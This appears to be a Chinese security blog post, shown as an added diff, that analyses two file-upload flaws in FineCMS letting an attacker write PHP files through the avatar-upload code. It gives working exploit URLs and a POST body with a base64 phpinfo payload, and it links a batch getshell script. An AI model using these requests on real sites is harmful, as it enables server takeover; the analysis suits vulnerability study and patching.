+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$data) {
+            <span style="color:#75715e">// 安全码认证
+</span><span style="color:#75715e"></span>            <span style="color:#75715e">//从get接收auth的参数
+</span><span style="color:#75715e"></span>            $auth <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;auth&#39;</span>);
+            <span style="color:#75715e">//SYS_KEY的值为24b16fede9a67c9251d3e7c7161c83ac，如果auth不等于md5加密后的SYS_KEY就执行
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> ($auth <span style="color:#f92672">!=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">SYS_KEY</span>)) {
+                <span style="color:#75715e">// 授权认证码不正确
+</span><span style="color:#75715e"></span>                $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;授权认证码不正确&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+            }
+</code></pre></div><p>这段从get里面取param参数的值后进行判断，判断是否有param[&lsquo;cache&rsquo;]这个参数并且这个参数不能为空。下面这两个函数<code>dr_array2string</code>、<code>get_cache_data</code>一个在_\finecms\dayrui\helpers\function_helper.php_里、一个在_\finecms\dayrui\core\M_Controller.php_里面，一个是用于*将数组转换为字符串*，一个是用于*取缓存数据*，这两个函数代码便不需要再去详细分析了，因为和漏洞关系不大。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">else</span> {
+                <span style="color:#75715e">// 解析数据
+</span><span style="color:#75715e"></span>                $cache <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+                <span style="color:#75715e">//从get里面取param参数的值
+</span><span style="color:#75715e"></span>                $param <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;param&#39;</span>);
+                <span style="color:#75715e">//判断是否有param[&#39;cache&#39;]这个参数并且这个参数不能为空
+</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($param[<span style="color:#e6db74">&#39;cache&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $param[<span style="color:#e6db74">&#39;cache&#39;</span>]) {
+                    $cache <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">dr_array2string</span>($param));
+                    $data <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_cache_data</span>($cache);
+                }
+</code></pre></div><p>漏洞的核心代码就在这一段了，这里还判断一次<code>data</code>是否为空，因为上面已经把缓存写进了<code>data</code>就有数据不为空了。<code>$param=&quot;login&quot;</code>这段代码我省略了，因为和漏洞关系不大。当<code>$param == 'update_avatar'</code>为真的时候执行下面内容。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$data) {
+
+                    <span style="color:#66d9ef">if</span> ($param <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;login&#39;</span>) {
+                        <span style="color:#75715e">// 登录认证
+</span><span style="color:#75715e"></span>                       <span style="color:#75715e">//...........代码省略...........
+</span><span style="color:#75715e"></span>                    } <span style="color:#66d9ef">elseif</span> ($param <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;update_avatar&#39;</span>) {
+                        <span style="color:#75715e">// 更新头像
+</span><span style="color:#75715e"></span>                      
+</code></pre></div><p>获取uid，但下面没有检测所以不用加上&amp;uid的值,默认是0，_member\uid_会员目录下面这个的目录就是uid的保存目录。</p>
+<pre><code>$uid = (int)$_REQUEST['uid'];
+</code></pre><p>接收文件的参数,这句就是重点。</p>
+<pre><code>$file = $_REQUEST['file'];
+</code></pre><p>这段代码操作是删除目录<code>$dir</code>下的全部文件 ,再判断是否是目录,然后新建目录再给权限。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">SYS_UPLOAD_PATH</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/member/&#39;</span><span style="color:#f92672">.</span>$uid<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span>;
+<span style="color:#f92672">@</span><span style="color:#a6e22e">dr_dir_delete</span>($dir);
+ <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($dir)) {
+         <span style="color:#a6e22e">dr_mkdirs</span>($dir);
+</code></pre></div><p>这里是把<code>file</code>里面的空格替换成+</p>
+<pre><code>$file = str_replace(' ', '+', $file);
+</code></pre><p>这里用到了正则表达式的知识了，正好前段时间学了Python的正则表达式也复习下</p>
+<blockquote>
+<p>^表示要以下面的表达式开头
+*表示匹配前面的子表达式零次或多次
+/接特殊字符
+()表示一个分组</p>
+</blockquote>
+<p><a href="http://php.net/manual/en/function.preg-match.php" title="preg_match">preg_match</a>  的用法
+匹配字样为<code>data:image/后缀;base64,</code>
+<code>preg_match</code>把匹配到得的两个分组分给了<code>$result</code>变量中。
+<code>$new_file</code>文件名，等于上面<code>$dir</code>+<code>0x0.</code>+<code>$result[2]</code>
+<code>$dir</code>这个上面分析已经有了就是网站的上传目录，<code>$result[2]</code>表示后缀名，值就是表达式里面的<code>(\w+)</code>分组。
+<a href="http://php.net/manual/en/function.file-put-contents.php" title="file_put_contents">file_put_contents</a>  的用法大家也再熟悉不过了。
+<code>base64_decode(str_replace($result[1], '', $file)))</code>里面用了两个函数，先用<code>str_replace</code>替换<code>data:image/php;base64,</code>为空，然后用<code>base64_decode</code>解密剩下的字符</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^(data:\s*image\/(\w+);base64,)/&#39;</span>, $file, $result)){
+        $new_file <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;0x0.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>];
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!@</span><span style="color:#a6e22e">file_put_contents</span>($new_file, <span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">str_replace</span>($result[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#39;&#39;</span>, $file))))
+</code></pre></div><p>所以从上面的代码分析出来，我们所需要输入的参数就有<code>auth</code>、<code>param</code>、<code>file</code>、而<code>file</code>的内容就是关键，可以看出写入的文件内容和文件名都是可控的，然后这个上传到的目录也很明确。
+构建的代码为PD9waHAgcGhwaW5mbygpOz8+解密为<code>&lt;?php phpinfo();?&gt;</code></p>
+<pre><code>http://127.0.0.1/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=update_avatar&amp;file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+
+</code></pre><h2 id="第二处漏洞分析">第二处漏洞分析</h2>
+<h3 id="漏洞代码文件和位置">漏洞代码文件和位置</h3>
+<p><strong>代码位置：</strong></p>
+<p><strong>/finecms/dayrui/controllers/member/Account.php</strong></p>
+<p><strong>核心代码：</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload</span>() {
+
+    <span style="color:#75715e">// 创建图片存储文件夹;
+</span><span style="color:#75715e"></span>    $dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">SYS_UPLOAD_PATH</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/member/&#39;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span>;
+    <span style="color:#f92672">@</span><span style="color:#a6e22e">dr_dir_delete</span>($dir);
+    <span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($dir) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">dr_mkdirs</span>($dir);
+
+    <span style="color:#66d9ef">if</span> ($_POST[<span style="color:#e6db74">&#39;tx&#39;</span>]) {
+        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>, $_POST[<span style="color:#e6db74">&#39;tx&#39;</span>]);
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^(data:\s*image\/(\w+);base64,)/&#39;</span>, $file, $result)){
+            $new_file <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;0x0.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>];
+            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!@</span><span style="color:#a6e22e">file_put_contents</span>($new_file, <span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">str_replace</span>($result[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#39;&#39;</span>, $file)))) {
+                <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;目录权限不足或磁盘已满&#39;</span>));
+            } <span style="color:#66d9ef">else</span> {
+                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">load</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">library</span>(<span style="color:#e6db74">&#39;image_lib&#39;</span>);
+                $config[<span style="color:#e6db74">&#39;create_thumb&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">TRUE</span>;
+                $config[<span style="color:#e6db74">&#39;thumb_marker&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+                $config[<span style="color:#e6db74">&#39;maintain_ratio&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">FALSE</span>;
+                $config[<span style="color:#e6db74">&#39;source_image&#39;</span>] <span style="color:#f92672">=</span> $new_file;
+                <span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">180</span>) <span style="color:#66d9ef">as</span> $a) {
+                    $config[<span style="color:#e6db74">&#39;width&#39;</span>] <span style="color:#f92672">=</span> $config[<span style="color:#e6db74">&#39;height&#39;</span>] <span style="color:#f92672">=</span> $a;
+                    $config[<span style="color:#e6db74">&#39;new_image&#39;</span>] <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span>$a<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">.</span>$a<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>];
+                    $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">image_lib</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">initialize</span>($config);
+                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">image_lib</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">resize</span>()) {
+                        <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;上传错误：&#39;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">image_lib</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">display_errors</span>()));
+                        <span style="color:#66d9ef">break</span>;
+                    }
+                }
+                <span style="color:#66d9ef">list</span>($width, $height, $type, $attr) <span style="color:#f92672">=</span> <span style="color:#a6e22e">getimagesize</span>($dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;45x45.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>]);
+                <span style="color:#f92672">!</span>$type <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;图片字符串不规范&#39;</span>));
+            }
+        } <span style="color:#66d9ef">else</span> {
+
+            <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;图片字符串不规范&#39;</span>));
+        }
+    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;图片不存在&#39;</span>));
+    }
+
+<span style="color:#75715e">// 上传图片到服务器
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;UCSSO_API&#39;</span>)) {
+        $rt <span style="color:#f92672">=</span> <span style="color:#a6e22e">ucsso_avatar</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span>, <span style="color:#a6e22e">file_get_contents</span>($dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;90x90.jpg&#39;</span>));
+        <span style="color:#f92672">!</span>$rt[<span style="color:#e6db74">&#39;code&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;通信失败：%s&#39;</span>, $rt[<span style="color:#e6db74">&#39;msg&#39;</span>]));
+    }
+
+
+    <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;1&#39;</span>);
+}
+</code></pre></div><h3 id="执行结果-1">执行结果</h3>
+<p>执行代码：</p>
+<p><code>http://127.0.0.1/index.php?s=member&amp;c=account&amp;m=upload</code></p>
+<p>POST:<code>tx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+</code></p>
+<p>结果图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_upload.png" alt=""></p>
+<h3 id="分析过程-1">分析过程</h3>
+<p>这一段和第一个漏洞差不多，删除会员下的目录再重新创建。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> $dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">SYS_UPLOAD_PATH</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/member/&#39;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span>;
+    <span style="color:#f92672">@</span><span style="color:#a6e22e">dr_dir_delete</span>($dir);
+    <span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($dir) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">dr_mkdirs</span>($dir);
+</code></pre></div><p>这段检测POST中是否有<code>tx</code>这个参数，然后把当中的空格替换成+</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> ($_POST[<span style="color:#e6db74">&#39;tx&#39;</span>]) {
+        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>, $_POST[<span style="color:#e6db74">&#39;tx&#39;</span>]);
+</code></pre></div><p>这个和第一个一样，匹配，当中的$result都是可控的，所以直接getshell就行了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^(data:\s*image\/(\w+);base64,)/&#39;</span>, $file, $result)){
+            $new_file <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;0x0.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>];
+            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!@</span><span style="color:#a6e22e">file_put_contents</span>($new_file, <span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">str_replace</span>($result[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#39;&#39;</span>, $file)))) {
+                <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;目录权限不足或磁盘已满&#39;</span>));
+</code></pre></div><p>但是这个是要登录才能getshell的，为什么上面的Api就不能登录也能使用呢?大家都是继承了<code>M_Controller</code>的父类，我们来看下<code>M_Controller</code>类226行的一段代码，下面判断了数组里面4个值，但是<code>Member</code>这个控制器不在数组里面，所以要验证登录信息。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;DR_UEDITOR&#39;</span>)
+                <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;DR_PAY_ID&#39;</span>)
+                <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;DISCUZ_ROOT&#39;</span>)
+                <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">router</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">class</span>, <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;register&#39;</span>, <span style="color:#e6db74">&#39;login&#39;</span>, <span style="color:#e6db74">&#39;api&#39;</span>, <span style="color:#e6db74">&#39;sns&#39;</span>))) {
+                $url <span style="color:#f92672">=</span> <span style="color:#a6e22e">dr_member_url</span>(<span style="color:#e6db74">&#39;login/index&#39;</span>, <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;backurl&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">dr_now_url</span>())));
+                <span style="color:#75715e">// 没有登录时
+</span><span style="color:#75715e"></span>                <span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">member</span> <span style="color:#f92672">&amp;&amp;</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">member_msg</span>(<span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;会话超时，请重新登录&#39;</span>)<span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">member_model</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">logout</span>(), $url);
+            }
+</code></pre></div><p>构建代码：</p>
+<p><code>http://127.0.0.1/index.php?s=member&amp;c=account&amp;m=upload</code></p>
+<p>POST:`tx=data:image/后缀名;base64,要写入文件内容的base64编码</p>
+<h2 id="编写自动化工具">编写自动化工具</h2>
+<p>我参考的那篇文章里面代码，我直接也照着写了一个批量Getshell的脚本，代码可以到我的Github下载</p>
+<p>地址:https://github.com/F0r3at/Python-Tools</p>
+<h2 id="参考">参考</h2>
+<p><a href="http://4o4notfound.org/index.php/archives/40/">http://4o4notfound.org/index.php/archives/40/</a></p>
+<p><a href="http://php.net/docs.php">http://php.net/docs.php</a></p>
+<p>源码下载地址：https://pan.lanzou.com/i0gd72d</p>
+</div>
+<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">
+
+
+
+
+
+
+
+
+
+
+<div class="toc">
+
+    <div class="page-header"><strong>目录</strong></div>
+
+    <div id="page-scrollspy" class="toc-nav">
+
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e5%89%8d%e8%a8%80">
+                            前言
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e7%ac%ac%e4%b8%80%e5%a4%84%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
+                            第一处漏洞分析
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e6%96%87%e4%bb%b6%e4%bd%8d%e7%bd%ae%e5%92%8c%e4%bb%a3%e7%a0%81">
+                            漏洞文件位置和代码
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%89%a7%e8%a1%8c%e7%bb%93%e6%9e%9c">
+                            执行结果
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e5%88%86%e6%9e%90%e8%bf%87%e7%a8%8b">
+                            分析过程
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e7%ac%ac%e4%ba%8c%e5%a4%84%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
+                            第二处漏洞分析
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e4%bb%a3%e7%a0%81%e6%96%87%e4%bb%b6%e5%92%8c%e4%bd%8d%e7%bd%ae">
+                            漏洞代码文件和位置
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%89%a7%e8%a1%8c%e7%bb%93%e6%9e%9c-1">
+                            执行结果
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e5%88%86%e6%9e%90%e8%bf%87%e7%a8%8b-1">
+                            分析过程
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e7%bc%96%e5%86%99%e8%87%aa%e5%8a%a8%e5%8c%96%e5%b7%a5%e5%85%b7">
+                            编写自动化工具
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e5%8f%82%e8%80%83">
+                            参考
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+
+    </div>
+
+</div>
+
+
+
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
+  </div>
+</footer>
+</body>
+</html>
